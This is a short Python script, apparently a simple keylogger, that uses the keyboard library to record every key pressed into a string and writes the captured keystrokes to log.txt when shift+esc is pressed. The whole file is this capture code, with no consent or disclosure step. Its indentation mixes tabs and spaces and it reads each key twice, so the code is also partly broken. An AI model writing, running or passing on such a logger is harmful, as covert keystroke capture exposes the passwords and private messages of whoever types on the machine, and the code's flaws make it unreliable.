import keyboard
import os

ans = ""

def exit_():
	f = open("log.txt","w") 
	f.write(ans) 
	f.close()
	
	os._exit(1)

while True:
    try: 
    	keyboard.add_hotkey('shift+esc', exit_)
        if keyboard.read_key():
        	key = keyboard.read_key()
        	ans += key
        else:
            pass
    except:
        break
